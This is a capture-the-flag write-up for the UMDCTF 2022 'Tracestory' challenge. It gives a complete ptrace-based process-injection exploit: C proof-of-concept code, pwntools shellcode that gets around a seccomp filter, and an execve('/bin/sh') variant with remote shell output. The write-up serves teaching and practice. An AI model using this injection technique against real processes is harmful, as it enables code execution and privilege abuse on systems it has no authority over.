# UMDCTF 2022

## Tracestory

> I am trying to figure out the end of this story, but I am not able to read it. Could you help me figure out what it is?
>
> **Author**: WittsEnd2
>
> `0.cloud.chals.io 15148`
>
> [`trace_story`](trace_story)

Tags: _pwn_ _x86-64_ _ptrace_ _shellcode_ _seccomp_


## Summary

This challenge is not dissimilar to other _run-my-shellcode_ challenges, however the shellcode is used to inject shellcode into the existing program text of a child process to bypass seccomp constraints.  

The seccomp allow list has no `read`/`write`, however the gift of `ptrace` (and `gettimeofday`) is all we need since the child process is forked before the seccomp filters are set (IOW, we can use the child process for I/O).

You can proof-of-concept this in GDB then use that to craft a `ptrace` payload.

This challenge is a great way to learn about `ptrace`.  If new to `ptrace` consider reading [https://www.linuxjournal.com/article/6210](https://www.linuxjournal.com/article/6210)--it's 20 years old, but it's still spot on and very useful.

> There are multiple ways to solve this.  Below is just _one_ way.

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE will make [hot] patching with `ptrace` very easy.


### Ghidra Decompile

```c
undefined8 main(void)
{
  uint uVar1;
  code *pcVar2;
  long in_FS_OFFSET;
  undefined local_1018 [4104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  memcpy(local_1018,"Finishing\n",0xb);
  uVar1 = fork();
  if (uVar1 == 0) {
    read_story();
  }
  if (debug != 0) {
    printf("[DEBUG] child pid: %d\n",(ulong)uVar1);
  }
  pcVar2 = (code *)read_input();
  setup_seccomp();
  (*pcVar2)();
  printf("%s",local_1018);
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
  __stack_chk_fail();
}
```

As stated in the summary above, this is a shellcode runner challenge, but with seccomp constraints.

If there is a vuln, it'd be forking _before_ `setup_seccomp`.

`main` forks and calls `read_story` from the child process, the parent reads in our shellcode, calls `setup_seccomp`, then executes our code constrained by seccomp filters:

```bash
# seccomp-tools dump ./trace_story
[DEBUG] child pid: 28378
Input:

 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x18 0xc000003e  if (A != ARCH_X86_64) goto 0026
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x15 0xffffffff  if (A != 0xffffffff) goto 0026
 0005: 0x15 0x13 0x00 0x00000003  if (A == close) goto 0025
 0006: 0x15 0x12 0x00 0x00000004  if (A == stat) goto 0025
 0007: 0x15 0x11 0x00 0x00000005  if (A == fstat) goto 0025
 0008: 0x15 0x10 0x00 0x00000006  if (A == lstat) goto 0025
 0009: 0x15 0x0f 0x00 0x0000000a  if (A == mprotect) goto 0025
 0010: 0x15 0x0e 0x00 0x0000000c  if (A == brk) goto 0025
 0011: 0x15 0x0d 0x00 0x00000015  if (A == access) goto 0025
 0012: 0x15 0x0c 0x00 0x00000018  if (A == sched_yield) goto 0025
 0013: 0x15 0x0b 0x00 0x00000020  if (A == dup) goto 0025
 0014: 0x15 0x0a 0x00 0x00000021  if (A == dup2) goto 0025
 0015: 0x15 0x09 0x00 0x00000038  if (A == clone) goto 0025
 0016: 0x15 0x08 0x00 0x0000003c  if (A == exit) goto 0025
 0017: 0x15 0x07 0x00 0x0000003e  if (A == kill) goto 0025
 0018: 0x15 0x06 0x00 0x00000050  if (A == chdir) goto 0025
 0019: 0x15 0x05 0x00 0x00000051  if (A == fchdir) goto 0025
 0020: 0x15 0x04 0x00 0x00000060  if (A == gettimeofday) goto 0025
 0021: 0x15 0x03 0x00 0x00000065  if (A == ptrace) goto 0025
 0022: 0x15 0x02 0x00 0x00000066  if (A == getuid) goto 0025
 0023: 0x15 0x01 0x00 0x00000068  if (A == getgid) goto 0025
 0024: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0026
 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0026: 0x06 0x00 0x00 0x00000000  return KILL
```

This allow list has a number of useful syscalls, however `ptrace` is all we need to control the child process (that is _not_ constrained by seccomp filters).

### Solve

The child process is executing this loop:

```c
  do {
    uVar1 = getpid();
    if ((uVar1 & 1) == 0) {
      __fd = open("readstory.txt",0);
      if (__fd == 0) {
        if (debug != 0) {
          puts("Error when reading story.");
        }
        exit(1);
      }
      sVar2 = read(__fd,local_1018,0x1000);
      if (sVar2 == 0) {
        if (debug != 0) {
          puts("Didn\'t read anything.");
        }
        exit(1);
      }
      close(__fd);
    }
    sleep(1);
  } while( true );
```

The challenge description, _I am trying to figure out the end of this story, but I am not able to read it. Could you help me figure out what it is?_, implies we should get to the end of the story, so I patch this code to effectively be:

```c
  do {
    uVar1 = getpid();
    if ((uVar1 & 1) == 0) {
      __fd = open("readstory.txt",0);
      if (__fd == 0) {
        if (debug != 0) {
          puts("Error when reading story.");
        }
        exit(1);
      }
      sVar2 = read(__fd,local_1018,0x1000);
      puts(local_1018);
      close(__fd);
    }
    sleep(1);
  } while( true );
```

This will dump [`readstory.txt`](readstory.txt) to `stdout`, and yes, it is cut off, so I modified the patch to read `0x2000` bytes vs. `0x1000`, and _yes!_  I have the entire story, however, no flag.

> I also used `write` to dump out the stack, just to check if on stack, e.g. in environmental variables.  It was not clear what _trying to figure out the end of this story_ really meant.

Next I tried to replace `readstory.txt` with `flag.txt` and then `flag`.  `flag` worked; final patch is effectively:

```c
  do {
    uVar1 = getpid();
    if ((uVar1 & 1) == 0) {
      __fd = open("flag",0);
      if (__fd == 0) {
        if (debug != 0) {
          puts("Error when reading story.");
        }
        exit(1);
      }
      sVar2 = read(__fd,local_1018,0x1000);
      puts(local_1018);
      close(__fd);
    }
    sleep(1);
  } while( true );
```

The `flag` is emitted over and over in a loop every second.

The patch is surprisingly simple in assembly.

This is the stack of the child process right after the `read` statement:

```
0x00007fffb5654fa0│+0x0000: 0x0000000300006ee2	 ← $rsp
0x00007fffb5654fa8│+0x0008: 0x0000000000001000
0x00007fffb5654fb0│+0x0010: "First and foremost, I just need to assert what was"	 ← $rsi
0x00007fffb5654fb8│+0x0018: "d foremost, I just need to assert what was right a[...]"
0x00007fffb5654fc0│+0x0020: "st, I just need to assert what was right and what [...]"
0x00007fffb5654fc8│+0x0028: "st need to assert what was right and what was wron[...]"
0x00007fffb5654fd0│+0x0030: "to assert what was right and what was wrong. I thi[...]"
0x00007fffb5654fd8│+0x0038: "t what was right and what was wrong. I think, befo[...]"
```

As expected `rsi` is pointing to the `readstory.txt` text.

> Above is what remote would look like, locally you've have created your own `readstory.txt` with some other content.

All that is required to patch is to `nop` then `mov rdi, rsi` just before the `puts`:

```assembly
  4017fd:   e8 de f9 ff ff          call   4011e0 <read@plt>

  401802:   48 89 85 e8 ef ff ff    mov    QWORD PTR [rbp-0x1018],rax
  401809:   48 83 bd e8 ef ff ff    cmp    QWORD PTR [rbp-0x1018],0x0
  401810:   00
  401811:   75 1e                   jne    401831 <read_story+0xcf>
  401813:   8b 05 9f 28 00 00       mov    eax,DWORD PTR [rip+0x289f]        # 4040b8 <debug>
  401819:   85 c0                   test   eax,eax
  40181b:   74 0a                   je     401827 <read_story+0xc5>
  40181d:   bf 39 20 40 00          mov    edi,0x402039

  401822:   e8 49 f9 ff ff          call   401170 <puts@plt>
```

The 32-bytes `0x401802`-`0x401821` just need to be replaced with `nop` and `mov rdi, rsi`:

```assembly
  4017fd:   e8 de f9 ff ff          call   4011e0 <read@plt>
                                    nop
                                    nop
                                    ...
                                    mov    rdi, rsi
  401822:   e8 49 f9 ff ff          call   401170 <puts@plt>
```

Patching out the `exit` after the `puts`, and `flag` for `readstory.txt` is equally as trivial.

The only other thing to consider is:

```c
  do {
    uVar1 = getpid();
    if ((uVar1 & 1) == 0) {
```

If the child PID is not even, then nothing happens.  This can be patched out, however it did not work for me remotely, only locally.  So, for remote I check for the PID as even and retry if not even.


## Exploit Development

Above I stated you could proof-of-concept this in GDB and then write the exploit.  However, there was one more step for me, and that was to write a C version ([hotpatch.c](hotpatch.h)) to test my ideas before investing time in a shellcode version:

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <sys/user.h>

int main(int argc, char *argv[])
{
    pid_t pid;
    struct user_regs_struct regs;
    unsigned long ins;
    unsigned long addr = 0x401802;
    unsigned long addr_exit = 0x401827;
    unsigned long txt = 0x402011;

    if (argc != 2) {
        printf("usage: %s [pid]\n", argv[0]);
        return 1;
    }

    pid = atoi(argv[1]);
    ptrace(PTRACE_ATTACH, pid, NULL, NULL);
    //wait(NULL);
    sleep(1);

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    printf("rip: %llx\n",regs.rip);

    //puts after read patch
    ptrace(PTRACE_POKETEXT, pid, addr,    0x9090909090909090);
    ptrace(PTRACE_POKETEXT, pid, addr+8,  0x9090909090909090);
    ptrace(PTRACE_POKETEXT, pid, addr+16, 0x9090909090909090);
    ptrace(PTRACE_POKETEXT, pid, addr+24, 0xf789489090909090);

    //patchout exit
    ptrace(PTRACE_POKETEXT, pid, addr_exit+0, 0x9090909090909090);
    ptrace(PTRACE_POKETEXT, pid, addr_exit+2, 0x9090909090909090);

    //readstory.txt is now flag
    ptrace(PTRACE_POKETEXT, pid, txt, 0x67616c66);

    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    return 0;
}
```

`wait` is the proper way to, well, _wait_ for the signal that `ptrace` attach is complete.  However I could not find a way to call `wait` (I really didn't spend a lot of time on it).  So I tested with `sleep` since I could craft one with `gettimeofday`.

The `0x9090...` integer is really a bunch of `nop`s with the exception of the `mov rdi, rsi` instruction and the change to `flag`.  

> See below for how to assemble in `python` and generate these numbers.

To test, just run the challenge binary (until you get an even PID):

```bash
# ./trace_story
[DEBUG] child pid: 28486
Input:
```

Then in a different terminal run the hotpatch:

```bash
# ./hotpatch 28486
rip: 7f8ad958e334
```

Then check your first terminal:

```bash
# ./trace_story
[DEBUG] child pid: 28486
Input:
flag{flag}
oremost, I just need ...
...
```

You'll need to first create both `readstory.txt` and `flag` files.  Also note that `flag` overwrites `readstory.txt`.  The read buffer is not initialized.

With this POC in hand, creating the shellcode was trivial.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./trace_story', checksec=False)

while True:
    if args.REMOTE:
        p = remote('0.cloud.chals.io', 15148)
        online = 1
    else:
        p = process(binary.path)
        online = 0

    p.recvuntil(b'child pid: ')
    pid = int(p.recvline().strip().decode(),10)

    if pid & 1 == 0: break
    if not args.REMOTE: break

    # hack, force new connection to shake things up and perhaps get even on next attemp
    if 's' in locals(): s.close()
    s = remote('0.cloud.chals.io', 15148)
    log.info('PID {x} is not even, starting over...'.format(x = pid))
    p.close()
```

Mostly standard pwntools header with the following additions:

1. `online` is set to provide an easy assembly directive, more on this later.
2. If the PID is even OR if local, then `break` and move on.
3. I found that the remote is either always even or always odd with serial attempts.  Clearly it'd be more chaotic if multiple users hitting the service, however while writing this write up, I noticed it was one or the other.  I could break up the odd streak with an `nc` command in a different terminal window, but opted to automate with the `s = remote...`--same effect.

```python
# use ptrace to patch out right after read to just call puts
'''
  4017fd:   e8 de f9 ff ff          call   4011e0 <read@plt>

  401802:   48 89 85 e8 ef ff ff    mov    QWORD PTR [rbp-0x1018],rax
  401809:   48 83 bd e8 ef ff ff    cmp    QWORD PTR [rbp-0x1018],0x0
  401810:   00
  401811:   75 1e                   jne    401831 <read_story+0xcf>
  401813:   8b 05 9f 28 00 00       mov    eax,DWORD PTR [rip+0x289f]        # 4040b8 <debug>
  401819:   85 c0                   test   eax,eax
  40181b:   74 0a                   je     401827 <read_story+0xc5>
  40181d:   bf 39 20 40 00          mov    edi,0x402039

  401822:   e8 49 f9 ff ff          call   401170 <puts@plt>
'''

# also patch out exit after puts
'''
  401827:   bf 01 00 00 00          mov    edi,0x1
  40182c:   e8 0f fa ff ff          call   401240 <exit@plt>
'''

# code just nops and then moves rsi to rdi for the puts call
patch = asm(
f'''
mov rdi, rsi
''')

patch = (0x401822 - 0x401802 - len(patch)) * asm('nop') + patch
assert(len(patch) == 32)
patches = [ u64(bytes(patch[i*8:(i+1)*8])) for i in range(4) ]

PTRACE_ATTACH = 16
PTRACE_POKETEXT = 4
PTRACE_DETACH = 17
addr = 0x401802
addr_exit = 0x401827
```

The above just has the dissembled section as documentation for the hardcoded variables, followed by our 32-byte patch that is then broken up into (4) 64-bit words; `ptrace` patching writes words.

The `PTRACE_...` values are taken directly from `sys/ptrace.h` 

```python
payload = asm(
f'''
mov rdi, {PTRACE_ATTACH}
mov rsi, {pid}
xor rdx, rdx
xor r10, r10
mov rax, {constants.SYS_ptrace}
syscall

/* sleep(<=1) */
mov rdi, {binary.bss() + 0x100}
xor rsi, rsi
mov rax, {constants.SYS_gettimeofday}
syscall

mov rdx, rdi
mov rdi, {binary.bss() + 0x110}
loop:
mov rax, {constants.SYS_gettimeofday}
syscall
mov rax, [rdi]
sub rax, [rdx]
je loop

/* patch */
mov rdi, {PTRACE_POKETEXT}
mov rsi, {pid}
mov rdx, {addr}
mov r10, {patches[0]}
mov rax, {constants.SYS_ptrace}
syscall

add rdx, 8
mov r10, {patches[1]}
mov rax, {constants.SYS_ptrace}
syscall

add rdx, 8
mov r10, {patches[2]}
mov rax, {constants.SYS_ptrace}
syscall

add rdx, 8
mov r10, {patches[3]}
mov rax, {constants.SYS_ptrace}
syscall

/* change readstory.txt to flag */
mov rdx, {binary.search(b'readstory.txt').__next__()}
mov r10, 0x67616c66
mov rax, {constants.SYS_ptrace}
syscall

/* patch out exit so we get flag after flag */
mov rdx, {addr_exit}
mov r10, 0x9090909090909090
mov rax, {constants.SYS_ptrace}
syscall

add rdx, 2
mov rax, {constants.SYS_ptrace}
syscall

/* patch out even pid check, does not work remotely */
.if {online} == 0
mov rdx, {0x40179d}
mov rax, {constants.SYS_ptrace}
syscall
.endif

mov rdi, {PTRACE_DETACH}
xor rdx, rdx
xor r10, r10
mov rax, {constants.SYS_ptrace}
syscall

jmp $
''')

assert(len(payload) < 0x1ff)
```

The above shellcode is the same as the C code POC with the following three exceptions:

1. The `sleep(<=1)` block does not really sleep for one second.  On average it'll sleep for `0.5` seconds.  With a bit more code I could get this to one second, but it was good enough (and is necessary).
2. The `.if {online} == 0` block will patch out the even PID check if testing locally.  This code does not work remotely (actually I think it is safe to run, but you do not get the desired results).
3. The `jmp $`, it just an endless loop, this prevents the parent process from crashing; we need time for the flag to be emitted.

The `assert` is there to make sure the payload does not exceed `0x1ff` bytes.  There's some shitfuckery in `read_input` that overwrites the `0x1ff`th byte.  It can be mitigated if you did have longer code, but there was no need.

```python
log.info('child pid: {x}'.format(x = pid))
if not args.REMOTE:
    open('ppid','w').write(str(p.pid))
    open('pid','w').write(str(pid))

p.sendlineafter(b'Input: \n', payload)
flag = p.recvuntil(b'}').decode()
p.close()
if 's' in locals(): s.close()
print(flag)
```

And finally, get the flag.  The `if not args...` block is just for my local testing.  The rest should be obvious.


Output (local):

```bash
# ./exploit.py
[+] Starting local process '/pwd/datajerk/umdctf2022/trace_story/trace_story': pid 28053
[*] child pid: 28054
[*] Stopped process '/pwd/datajerk/umdctf2022/trace_story/trace_story' (pid 28053)
flag{flag}

# ./exploit.py
[+] Starting local process '/pwd/datajerk/umdctf2022/trace_story/trace_story': pid 28078
[*] child pid: 28079
[*] Stopped process '/pwd/datajerk/umdctf2022/trace_story/trace_story' (pid 28078)
flag{flag}
```

Above, locally odd or even PID works just fine.

Output (remote):

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to 0.cloud.chals.io on port 15148: Done
[+] Opening connection to 0.cloud.chals.io on port 15148: Done
[*] PID 1423 is not even, starting over...
[*] Closed connection to 0.cloud.chals.io port 15148
[+] Opening connection to 0.cloud.chals.io on port 15148: Done
[*] child pid: 1426
[*] Closed connection to 0.cloud.chals.io port 15148
[*] Closed connection to 0.cloud.chals.io port 15148
UMDCTF{Tr4C3_Thr0Ugh_3v3rYth1NG}
```

Retrying until even PID.


### Shell Version

```python
patch = asm(
f'''
mov rdi, {binary.search(b'readstory.txt').__next__()}
xor rsi, rsi
xor rdx, rdx
mov rax, {constants.SYS_execve}
syscall
''')
```

Payload is just changed to get a shell using `execve`.

Instead of `flag` replacing `readstory.txt`, it's `/bin/sh`.

See [`exploit2.py`](exploit2.py) for details.

Output:

```
# ./exploit2.py REMOTE=1
[+] Opening connection to 0.cloud.chals.io on port 15148: Done
[*] child pid: 1232
[*] Switching to interactive mode
$ ls -l
total 56
drwxr-x--- 1 0 1000  4096 Mar  3 03:26 bin
drwxr-x--- 1 0 1000  4096 Mar  3 03:26 dev
-rwxr----- 1 0 1000    32 Mar  3 03:22 flag
drwxr-x--- 1 0 1000  4096 Mar  3 03:26 lib
drwxr-x--- 1 0 1000  4096 Mar  3 03:26 lib32
drwxr-x--- 1 0 1000  4096 Mar  3 03:26 lib64
drwxr-x--- 1 0 1000  4096 Mar  3 03:26 libx32
-rwxr-x--- 1 0 1000  5628 Mar  3 12:12 readstory.txt
-rwxr-x--- 1 0 1000 17712 Mar  3 03:22 trace_story
$ cat flag
UMDCTF{Tr4C3_Thr0Ugh_3v3rYth1NG}
```